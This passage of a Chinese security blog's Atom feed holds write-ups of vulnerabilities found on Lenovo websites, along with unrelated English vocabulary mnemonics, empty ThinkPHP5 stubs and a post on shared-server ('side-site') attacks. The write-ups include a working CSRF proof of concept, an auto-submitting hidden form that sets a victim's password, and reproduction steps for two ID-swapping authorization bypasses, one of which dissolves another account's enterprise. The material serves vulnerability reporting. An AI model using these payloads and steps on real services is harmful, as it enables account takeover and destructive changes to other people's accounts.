class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">style</span>=<span class="string">"display:none;"</span> <span class="attr">name</span>=<span class="string">"px"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"http://vip.lenovo.com.cn/Account/ForgotPassword/UpdateForgotPassword"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"newPassword1"</span> <span class="attr">value</span>=<span class="string">"123456789aa&amp;#126;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"newPassword2"</span> <span class="attr">value</span>=<span class="string">"123456789aa&amp;#126;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"next"</span> <span class="attr">value</span>=<span class="string">"�&amp;#184;&amp;#139;�&amp;#184;&amp;#128;�&amp;#173;&amp;#165;"</span> /&gt;</span><span class="tag">&lt;/<span class="name">FORM</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">document.px.submit();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="浏览器处打开html文件"><a href="#浏览器处打开html文件" class="headerlink" title="浏览器处打开html文件"></a>浏览器处打开html文件</h5><p><img src="http://static.zybuluo.com/1kbfree/jmb40prydeckzzz68mi2emir/csrf5.png" alt="csrf5.png-180.1kB"></p><h5 id="我们再输入原先的密码"><a href="#我们再输入原先的密码" class="headerlink" title="我们再输入原先的密码"></a>我们再输入原先的密码</h5><p><img src="http://static.zybuluo.com/1kbfree/po891mq5w5wh1gu86q811og9/csrf6.png" alt="csrf6.png-196.3kB"></p><p><em>可以看到是失败的</em></p><h5 id="输入新密码123456789aa"><a href="#输入新密码123456789aa" class="headerlink" title="输入新密码123456789aa~"></a>输入新密码123456789aa~</h5><p><img src="http://static.zybuluo.com/1kbfree/3ohrv1nmjq76k7nj6lc2wkjv/csrf7.png" alt="csrf7.png-90.6kB"></p><p><img src="http://static.zybuluo.com/1kbfree/tdsqvah6m2ux655zitc0olnz/csrf8.png" alt="csrf8.png-88.5kB"></p><p><em>发现可以登录，说明<code>Csrf</code>漏洞利用成功</em></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;内部资料，禁止外泄!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&quot;note info&quot;&gt;&lt;p&gt;危害：当用户点击我( 攻击者 )构造好的Csrf Poc后，他们的密码就会修改成我( 攻击者 )设置好的密码~&lt;/p&gt;&lt;/div&gt;
    
    </summary>
    
      <category term="内部资料" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/"/>
    
      <category term="实战渗透" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/"/>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/Web%E6%94%BB%E9%98%B2/"/>
    
      <category term="一条快乐的咸鱼(作者)" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/Web%E6%94%BB%E9%98%B2/%E4%B8%80%E6%9D%A1%E5%BF%AB%E4%B9%90%E7%9A%84%E5%92%B8%E9%B1%BC-%E4%BD%9C%E8%80%85/"/>
    
    
      <category term="漏洞挖掘" scheme="127.0.0.1/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
      <category term="逻辑漏洞" scheme="127.0.0.1/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="Csrf漏洞" scheme="127.0.0.1/tags/Csrf%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>漏洞挖掘经验之联想两处越权漏洞</title>
    <link href="127.0.0.1/2018/06/13/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%81%94%E6%83%B3%E4%B8%A4%E5%A4%84%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    <id>127.0.0.1/2018/06/13/漏洞挖掘经验之联想两处越权漏洞/</id>
    <published>2018-06-13T11:52:02.000Z</published>
    <updated>2018-07-10T08:28:37.889Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>内部资料，禁止外泄！</p></blockquote><a id="more"></a><blockquote><p>漏洞Url：<a href="https://moc.lenovo.com" target="_blank" rel="noopener">https://moc.lenovo.com</a></p></blockquote><h3 id="联想某企业网站解散企业处越权漏洞"><a href="#联想某企业网站解散企业处越权漏洞" class="headerlink" title="联想某企业网站解散企业处越权漏洞"></a>联想某企业网站解散企业处越权漏洞</h3><h4 id="1-创建两个企业号，id分别为"><a href="#1-创建两个企业号，id分别为" class="headerlink" title="1. 创建两个企业号，id分别为"></a>1. 创建两个企业号，id分别为</h4><p>100645 and 100643</p><h4 id="2-打开url：https-moc-lenovo-com-moc-home-settings-do"><a href="#2-打开url：https-moc-lenovo-com-moc-home-settings-do" class="headerlink" title="2. 打开url：https://moc.lenovo.com/moc/home_settings.do"></a>2. 打开url：<a href="https://moc.lenovo.com/moc/home_settings.do" target="_blank" rel="noopener">https://moc.lenovo.com/moc/home_settings.do</a></h4><h4 id="3-点击解散企业"><a href="#3-点击解散企业" class="headerlink" title="3. 点击解散企业"></a>3. 点击解散企业</h4><p><img src="http://static.zybuluo.com/1kbfree/oa9zmjedsoiiorvkt99s3ltr/image_1cfsfh2dt176h1pn2sld6i9o7b9.png" alt="image_1cfsfh2dt176h1pn2sld6i9o7b9.png-83.5kB"></p><h4 id="4-在二次验证界面输入当前账号的密码并抓包"><a href="#4-在二次验证界面输入当前账号的密码并抓包" class="headerlink" title="4.在二次验证界面输入当前账号的密码并抓包"></a>4.在二次验证界面输入当前账号的密码并抓包</h4><p><img src="http://static.zybuluo.com/1kbfree/wpbk7mxo2715g9t9sgizszin/image_1cfsfi6am5vevellgr111odu0m.png" alt="image_1cfsfi6am5vevellgr111odu0m.png-103.9kB"></p><h4 id="5-找到这个数据包，当前企业id为100643，将其改为100645"><a href="#5-找到这个数据包，当前企业id为100643，将其改为100645" class="headerlink" title="5.找到这个数据包，当前企业id为100643，将其改为100645."></a>5.找到这个数据包，当前企业id为100643，将其改为100645.</h4><p><img src="http://static.zybuluo.com/1kbfree/pi1pl028cqes8naw9k2vbiua/image_1cfsfit595029i01t8015nj14eg13.png" alt="image_1cfsfit595029i01t8015nj14eg13.png-138.4kB"></p><h4 id="6-发送成功"><a href="#6-发送成功" class="headerlink" title="6.发送成功"></a>6.发送成功</h4><p><img src="http://static.zybuluo.com/1kbfree/mxyejrecxwn3ng1m6cpf6lnn/image_1cfsfj5tc1579f9bcriluf1ac61g.png" alt="image_1cfsfj5tc1579f9bcriluf1ac61g.png-47.1kB"></p><h4 id="7-刚才id为100645的企业已被解散"><a href="#7-刚才id为100645的企业已被解散" class="headerlink" title="7.刚才id为100645的企业已被解散"></a>7.刚才id为100645的企业已被解散</h4><p><img src="http://static.zybuluo.com/1kbfree/sm2fy5bsv1ndgc3j6svaoos9/image_1cfsfjsk3a6e74psb619di1vdd1t.png" alt="image_1cfsfjsk3a6e74psb619di1vdd1t.png-701.3kB"></p><h3 id="创建企业处越权漏洞"><a href="#创建企业处越权漏洞" class="headerlink" title="创建企业处越权漏洞"></a>创建企业处越权漏洞</h3><blockquote><p>漏洞url/位置：<br><a href="https://moc.lenovo.com/moc/home_login_callback.do" target="_blank" rel="noopener">https://moc.lenovo.com/moc/home_login_callback.do</a></p></blockquote><h4 id="复现步骤："><a href="#复现步骤：" class="headerlink" title="复现步骤："></a>复现步骤：</h4><h5 id="1-创建两个账户，都不先不选择创建企业。"><a href="#1-创建两个账户，都不先不选择创建企业。" class="headerlink" title="1.创建两个账户，都不先不选择创建企业。"></a>1.创建两个账户，都不先不选择创建企业。</h5><h5 id="2-选择任一账户，点击创建企业："><a href="#2-选择任一账户，点击创建企业：" class="headerlink" title="2.选择任一账户，点击创建企业："></a>2.选择任一账户，点击创建企业：</h5><p><img src="http://static.zybuluo.com/1kbfree/d6k35h9m5saj9tu97dctcqlb/image_1cfsfm8b7om616ul158v1vku2qo2q.png" alt="image_1cfsfm8b7om616ul158v1vku2qo2q.png-115.8kB"></p><h5 id="3-此时抓包，数据包中有一个staff-login值，此时为13开头的账户，将其改为另外一个账户的账号："><a href="#3-此时抓包，数据包中有一个staff-login值，此时为13开头的账户，将其改为另外一个账户的账号：" class="headerlink" title="3.此时抓包，数据包中有一个staff_login值，此时为13开头的账户，将其改为另外一个账户的账号："></a>3.此时抓包，数据包中有一个staff_login值，此时为13开头的账户，将其改为另外一个账户的账号：</h5><p><img src="http://static.zybuluo.com/1kbfree/2kd8ys0gwz2ydbb5egxirj31/image_1cfsfnas31mu8163o1ljkjhn9og37.png" alt="image_1cfsfnas31mu8163o1ljkjhn9og37.png-262.6kB"></p><h5 id="4-发送成功，回显success"><a href="#4-发送成功，回显success" class="headerlink" title="4.发送成功，回显success"></a>4.发送成功，回显success</h5><p><img src="http://static.zybuluo.com/1kbfree/85pouzgb8f20xb43wkbxppdn/image_1cfsfnjikvvr1p2q92fsm4e533k.png" alt="image_1cfsfnjikvvr1p2q92fsm4e533k.png-27.8kB"></p><h5 id="5-登陆到另一个账户中，发现果然创建成功"><a href="#5-登陆到另一个账户中，发现果然创建成功" class="headerlink" title="5.登陆到另一个账户中，发现果然创建成功"></a>5.登陆到另一个账户中，发现果然创建成功</h5><p><img src="http://static.zybuluo.com/1kbfree/6ejbg8nl37l87b07j1gtr9kn/image_1cfsfnqpc72p1p5g1cephkm12b141.png" alt="image_1cfsfnqpc72p1p5g1cephkm12b141.png-35.9kB"></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;内部资料，禁止外泄！&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="内部资料" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/"/>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/Web%E6%94%BB%E9%98%B2/"/>
    
      <category term="作者(逗逗)" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/Web%E6%94%BB%E9%98%B2/%E4%BD%9C%E8%80%85-%E9%80%97%E9%80%97/"/>
    
    
      <category term="漏洞挖掘" scheme="127.0.0.1/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
      <category term="越权漏洞" scheme="127.0.0.1/tags/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="实战渗透" scheme="127.0.0.1/tags/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>英语词汇学习</title>
    <link href="127.0.0.1/2018/06/07/%E8%8B%B1%E8%AF%AD%E8%AF%8D%E6%B1%87%E5%AD%A6%E4%B9%A0/"/>
    <id>127.0.0.1/2018/06/07/英语词汇学习/</id>
    <published>2018-06-07T15:48:22.000Z</published>
    <updated>2018-06-11T13:09:56.828Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>巧用技巧来学习英语，让你更快记住单词，这是一个英语词汇必备的复习文章，持续更新中~</p></blockquote><a id="more"></a><h3 id="back"><a href="#back" class="headerlink" title="back"></a>back</h3><p>中文:后背<br>读音:ba(第四声)可</p><h3 id="bake"><a href="#bake" class="headerlink" title="bake"></a>bake</h3><p>中文:烘焙<br>读音:bei(第四声)可</p><h3 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h3><p>中文:容易<br>读音:衣ji</p><h3 id="strong"><a href="#strong" class="headerlink" title="strong"></a>strong</h3><p>中文:强壮<br>读音:死状</p><h3 id="fee"><a href="#fee" class="headerlink" title="fee"></a>fee</h3><p>中文:费用<br>读音:fei(四)</p><h3 id="fly"><a href="#fly" class="headerlink" title="fly"></a>fly</h3><p>中文:飞<br>读音:福来<br>句子( 加深记忆 ):他的<strong>福</strong>气是 <em>飞</em> 过<strong>来</strong>的</p><h3 id="leave"><a href="#leave" class="headerlink" title="leave"></a>leave</h3><p>中文:离开<br>读音:离(四)唔</p><h3 id="sleeve"><a href="#sleeve" class="headerlink" title="sleeve"></a>sleeve</h3><p>中文:袖子<br>读音:使力舞</p><blockquote><p><code>leave</code>和<code>sleeve</code>造句：<br>悄悄的我leave(走了),正如我悄悄的来<br>我挥一挥sleeve(衣袖),不带走一片云彩</p></blockquote><h3 id="drag"><a href="#drag" class="headerlink" title="drag"></a>drag</h3><p>中文:拖、拽<br>读音：拽胳</p><h3 id="push"><a href="#push" class="headerlink" title="push"></a>push</h3><p>中文：推<br>读音：怕使<br>图解：<img src="http://static.zybuluo.com/1kbfree/vyxzdviwmjaojm86av6axjko/image_1cfded7as1sro14rgf8r1j19hmr9.png" alt="image_1cfded7as1sro14rgf8r1j19hmr9.png-41.4kB"></p><h3 id="pull"><a href="#pull" class="headerlink" title="pull"></a>pull</h3><p>中文：拉<br>读音：po(四)<br>图解:<img src="http://static.zybuluo.com/1kbfree/whpxujlqnfq7awawvkaikval/image_1cfdefsm61dod14hn3vuuqt1em946.png" alt="image_1cfdefsm61dod14hn3vuuqt1em946.png-42.8kB"></p><h3 id="chart"><a href="#chart" class="headerlink" title="chart"></a>chart</h3><p>中文：图纸<br>读音：插纸</p><h3 id="cruel"><a href="#cruel" class="headerlink" title="cruel"></a>cruel</h3><p>中文：残酷<br>读音：哭咯<br>句子：因为现实很 <strong>残酷</strong> 所以他 <strong>哭咯</strong></p><h3 id="debt"><a href="#debt" class="headerlink" title="debt"></a>debt</h3><p>中文：债务<br>读音：贷te<br>句子：他欠了债务，所以有很多贷te等他还</p><h3 id="rude"><a href="#rude" class="headerlink" title="rude"></a>rude</h3><p>中文：粗鲁，无礼<br>读音：入的<br>句子：他不敲门就进 <strong>入</strong> 我的房间，这很 <strong>粗鲁</strong> ，很无礼</p><h3 id="fine"><a href="#fine" class="headerlink" title="fine"></a>fine</h3><p>中文: 好的 n.罚款<br>读音：fai(四)<br>句子：罚款只是为了你变 <strong>fine</strong>(好的)</p><h3 id="finance"><a href="#finance" class="headerlink" title="finance"></a>finance</h3><p>中文：金融<br>读音：犯难事<br>句子：金融方面遇到了问题，所以我犯难事</p><h3 id="deliver"><a href="#deliver" class="headerlink" title="deliver"></a>deliver</h3><p>中文：递送 分娩 发言<br>读音：递里我<br>句子：</p><ol><li>交出一个东西-&gt;递送</li><li>交出一个孩子-&gt;分娩</li><li>交出一个意见-&gt;发言</li></ol><h3 id="mud"><a href="#mud" class="headerlink" title="mud"></a>mud</h3><p>中文：泥<br>读音：骂的<br>句子：我浑身是泥，所以我给家长<strong>骂的</strong>哭了</p><h3 id="pet"><a href="#pet" class="headerlink" title="pet"></a>pet</h3><p>中文：宠物<br>读音：陪(四)它<br>句子：我养了一只宠物，我天天陪它</p><h3 id="pest"><a href="#pest" class="headerlink" title="pest"></a>pest</h3><p>中文：害虫<br>读音：拍死他<br>句子：这个害虫有毒，我要拍死他</p><h3 id="gift"><a href="#gift" class="headerlink" title="gift"></a>gift</h3><p>中文：礼物<br>读音：给(四)福特<br>句子：他礼物是给福特的</p><h3 id="respond"><a href="#respond" class="headerlink" title="respond"></a>respond</h3><p>中文：回答，答复<br>读音：瑞是棒的<br>句子：瑞同学回答了这个问题，所以大家都在喊瑞是棒的</p><h3 id="response"><a href="#response" class="headerlink" title="response"></a>response</h3><p>中文：响应<br>读音：瑞士胖死<br>句子：瑞士有一个人胖死了，政府没做出响应</p><h3 id="responsible"><a href="#responsible" class="headerlink" title="responsible"></a>responsible</h3><p>中文：尽责的<br>读音：瑞士胖死婆<br>句子：及时做出respond，他很尽责的</p><h3 id="correspond"><a href="#correspond" class="headerlink" title="correspond"></a>correspond</h3><p>中文：符合，通信</p><h3 id="terrible"><a href="#terrible" class="headerlink" title="terrible"></a>terrible</h3><p>中文：可怕的，糟糕的<br>读音：胎若爆<br>句子：在高速公路上，胎若爆了，就会很可怕</p><h3 id="terrify"><a href="#terrify" class="headerlink" title="terrify"></a>terrify</h3><p>中文：恐吓</p><h3 id="terror"><a href="#terror" class="headerlink" title="terror"></a>terror</h3><p>中文：恐怖<br>读音：泰罗<br>句子：程序又报错(error)了，真的是太恐怖了</p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;巧用技巧来学习英语，让你更快记住单词，这是一个英语词汇必备的复习文章，持续更新中~&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="英语学习" scheme="127.0.0.1/categories/%E8%8B%B1%E8%AF%AD%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="English" scheme="127.0.0.1/tags/English/"/>
    
      <category term="扩大业务必备技能" scheme="127.0.0.1/tags/%E6%89%A9%E5%A4%A7%E4%B8%9A%E5%8A%A1%E5%BF%85%E5%A4%87%E6%8A%80%E8%83%BD/"/>
    
  </entry>
  
  <entry>
    <title>[TP5]自定义配置文件</title>
    <link href="127.0.0.1/2018/06/06/TP5-%E8%87%AA%E5%AE%9A%E4%B9%89%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"/>
    <id>127.0.0.1/2018/06/06/TP5-自定义配置文件/</id>
    <published>2018-06-06T10:10:42.000Z</published>
    <updated>2018-06-06T10:10:42.805Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;十年寒窗无人问，一举成名天下知&lt;br&gt;                            – Cai_Team&lt;/p&gt;
&lt;/blockquote&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>[TP5]扩展配置目录</title>
    <link href="127.0.0.1/2018/06/06/TP5-%E6%89%A9%E5%B1%95%E9%85%8D%E7%BD%AE%E7%9B%AE%E5%BD%95/"/>
    <id>127.0.0.1/2018/06/06/TP5-扩展配置目录/</id>
    <published>2018-06-06T10:10:25.000Z</published>
    <updated>2018-07-10T08:30:05.692Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;十年寒窗无人问，一举成名天下知&lt;br&gt;                            – Cai_Team&lt;/p&gt;
&lt;/blockquote&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>[TP5]配置文件格式</title>
    <link href="127.0.0.1/2018/06/06/TP5-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"/>
    <id>127.0.0.1/2018/06/06/TP5-配置文件格式/</id>
    <published>2018-06-06T10:10:12.000Z</published>
    <updated>2018-06-06T10:10:12.417Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;十年寒窗无人问，一举成名天下知&lt;br&gt;                            – Cai_Team&lt;/p&gt;
&lt;/blockquote&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>TP5入口文件</title>
    <link href="127.0.0.1/2018/06/06/%5BTP5%5D%E5%85%A5%E5%8F%A3%E6%96%87%E4%BB%B6/"/>
    <id>127.0.0.1/2018/06/06/[TP5]入口文件/</id>
    <published>2018-06-06T10:08:33.000Z</published>
    <updated>2018-06-06T10:15:03.753Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;十年寒窗无人问，一举成名天下知&lt;br&gt;                            – Cai_Team&lt;/p&gt;
&lt;/blockquote&gt;
      
    
    </summary>
    
      <category term="编程语言" scheme="127.0.0.1/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
      <category term="Web开发" scheme="127.0.0.1/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Web%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="thinkphp5框架" scheme="127.0.0.1/tags/thinkphp5%E6%A1%86%E6%9E%B6/"/>
    
      <category term="网站开发" scheme="127.0.0.1/tags/%E7%BD%91%E7%AB%99%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>旁注攻击</title>
    <link href="127.0.0.1/2018/06/05/%E6%97%81%E6%B3%A8%E6%94%BB%E5%87%BB/"/>
    <id>127.0.0.1/2018/06/05/旁注攻击/</id>
    <published>2018-06-05T15:20:08.000Z</published>
    <updated>2018-06-05T15:28:35.180Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>旁注攻击就是说在攻击目标时，对目标网站“无法下手”找不到目标网站的漏洞，那么攻击者就可以通过在与目标站点同一服务器下的站点渗透如，从而获取目标站点的权限，这过程就是旁注攻击</p></blockquote><a id="more"></a><p>简单的举个栗子，比如一个服务器有如下站点:<br><img src="http://static.zybuluo.com/1kbfree/s4019xggzf82sjiesayzxa6t/image_1cf848h6c1b4v1sflqph1dsuvee39.png" alt="image_1cf848h6c1b4v1sflqph1dsuvee39.png-29.4kB"></p><p>当攻击者在攻击<code>www.iamfree.a</code>的时候，没有发现漏洞，无法拿下此站点，那么攻击者就可以通过攻击<code>www.iamfree.b</code>并且成功攻破，得到了<code>Root</code>权限，那么这里不但<code>www.iamfree.a</code>的数据会被泄露，<code>www.iamfree.b</code>的数据也同样会被泄露，而<code>www.iamfree.c</code>网站是不会受到影响的。因为他不与<code>www.iamfree.b</code>在同一个数据库。但也不是说绝对的安全的，攻击者也可以通过数据库提权的方式获取到服务器管理员的权限，从而获取<code>Access</code>数据库里的内容。</p><p>大网站也存在有旁注攻击的风险，比如:<code>qq.com</code>，他有很多子域名，如图<br><img src="http://static.zybuluo.com/1kbfree/3ymscqzouadvamtxr9wqmksd/image_1cf87ar7nnmbtli1hkf1kk615l1p.png" alt="image_1cf87ar7nnmbtli1hkf1kk615l1p.png-98.3kB"><br>如此多的子域名，不可能说每个站点都一定是安全的，所以我们可以子域名来渗透到主域名。</p><p>那么疑问来了，攻击者怎么知道目标服务器上放置了哪些网站呢？这时候就要用到 IP逆向查询了。</p><h2 id="IP逆向查询"><a href="#IP逆向查询" class="headerlink" title="IP逆向查询"></a>IP逆向查询</h2><p>在线查询服务器下有哪些站点的网站：</p><ol><li><p><a href="https://www.yougetsignal.com/tools/web-sites-on-web-server/" target="_blank" rel="noopener">https://www.yougetsignal.com/tools/web-sites-on-web-server/</a></p><p> <img src="http://static.zybuluo.com/1kbfree/ogrcrpiw8jki4zges4vn72zt/image_1cf87suv9132qtfno5u1r45o1h19.png" alt="image_1cf87suv9132qtfno5u1r45o1h19.png-92.9kB"></p></li><li><p><a href="http://s.tool.chinaz.com/same/" target="_blank" rel="noopener">http://s.tool.chinaz.com/same/</a> </p><p> <img src="http://static.zybuluo.com/1kbfree/9yslwjvp37ru93imr1t5zudg/image_1cf882dr5bhesnp1k0vjb11vnf1m.png" alt="image_1cf882dr5bhesnp1k0vjb11vnf1m.png-70.9kB"></p></li><li><p><a href="https://dns.aizhan.com/" target="_blank" rel="noopener">https://dns.aizhan.com/</a></p><p> <img src="http://static.zybuluo.com/1kbfree/980cklf2mepmb5tjm3hiko5h/image_1cf884g691g28qut1uurvhj1dt123.png" alt="image_1cf884g691g28qut1uurvhj1dt123.png-46.8kB"></p></li><li><p>利用必应搜索引擎来IP逆向查询</p><p> <img src="http://static.zybuluo.com/1kbfree/yiiumoj9256s3tkbcirk2xmz/image_1cf88fe7b1p8e17ngah47pi7ok2g.png" alt="image_1cf88fe7b1p8e17ngah47pi7ok2g.png-133.1kB"></p></li></ol><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;旁注攻击就是说在攻击目标时，对目标网站“无法下手”找不到目标网站的漏洞，那么攻击者就可以通过在与目标站点同一服务器下的站点渗透如，从而获取目标站点的权限，这过程就是旁注攻击&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="渗透测试" scheme="127.0.0.1/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="旁站攻击" scheme="127.0.0.1/tags/%E6%97%81%E7%AB%99%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
</feed>
